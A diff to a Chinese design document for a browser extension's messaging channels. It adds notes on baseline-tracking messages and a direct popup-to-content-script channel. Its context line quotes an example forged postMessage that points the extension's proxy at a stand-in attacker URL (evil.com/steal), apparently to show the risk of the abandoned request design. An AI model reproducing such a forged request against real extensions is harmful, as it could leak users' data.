@@ -89,6 +89,49 @@ window.postMessage({ __pluma: true, type: 'req', url: 'https://evil.com/steal' }
 
 MAIN world 发请求后 **8 秒**无响应即视为失败，走原始请求（回退主账号）。这个值要比 SW 侧的请求超时短，保证用户不会看到空白播放器。
 
+> ⚠️ **`req` / `res` 是早期草案，从未实现。** 实际方案是 DNR 在网络层换 Cookie，
+> 不需要把请求代理回扩展（见 [ADR 0010](../decisions/0010-page-proxy-via-tab-ids.md)）。
+> 现行消息全部是**单向上报**（MAIN → ISOLATED），没有请求-应答。
+> 完整清单看 `entrypoints/content.ts` 的 `listenMainWorld()`，本文件只记新增的与容易误解的。
+
+### 现行消息里两个容易搞混的（2026-10-26 新增）
+
+都用于「主账号基线」（[ADR 0014](../decisions/0014-quality-compare-from-page-data.md)）：
+
+| type | 载荷 | 语义 |
+| --- | --- | --- |
+| `ssr-playinfo` | `{ firstSeen: 'initial'\|'set'\|'none', playurlBefore: boolean, data, user }` | 冻结的第一份 `__playinfo__` + 主账号 `uname`/`face` |
+| `playurl-raw` | `{ json }` | 页面自己那次 playurl 响应的**原文**（播放账号身份），只报一次 |
+
+**为什么两个都要带"时机"而不是只带数据**：
+
+`__playinfo__` 有两份说法互相矛盾（SSR vs 客户端写入）。如果它是页面**发完 playurl 之后**才写的，
+那份数据来自**已被代理**的请求 = 播放账号身份。拿它当主账号基线，画质对比会永远显示"没有提升"，
+且不报错、不崩溃。所以判据是 `firstSeen` + `playurlBefore`，判定在
+`src/content/isolated/page-state.ts`（纯函数，有单测）。
+
+`ssr-playinfo` 会被上报多次（hello / ready / 延迟补报）—— `__playinfo__` 与 `__INITIAL_STATE__`
+谁先就绪不确定。合并规则：能力只接受可用基线且不被后到的坏消息抹掉，`user` 后到覆盖先到。
+
+---
+
+## 通道 D：ISOLATED ↔ 扩展页面（popup / 诊断页）
+
+**新增于 2026-10-26。** 与通道 B/C 不同，这条**不经 Service Worker**。
+
+```
+扩展页面 --chrome.tabs.sendMessage(tabId, {type:'page/summary:get'})--> content
+扩展页面 <--{type:'page/summary:ok', view: PageTracksView}---------------
+```
+
+| 为什么直连 | 说明 |
+| --- | --- |
+| 数据只对"当前这个标签页"有意义 | content 本来就在那个页面里，绕 SW 只是多一份要维护的缓存 |
+| 不存在缓存过期 | 每次都拿到最新值，不会出现"popup 显示上一页数据" |
+| 代价 | 目标标签页没有 content script 时 `sendMessage` **抛异常**（不是返回空），调用方必须 catch |
+
+类型在 `src/shared/types/messages.ts` 的 `PageQueryMsg` / `PageQueryReply`。
+
 ---
 
 ## 通道 B：ISOLATED ↔ Service Worker
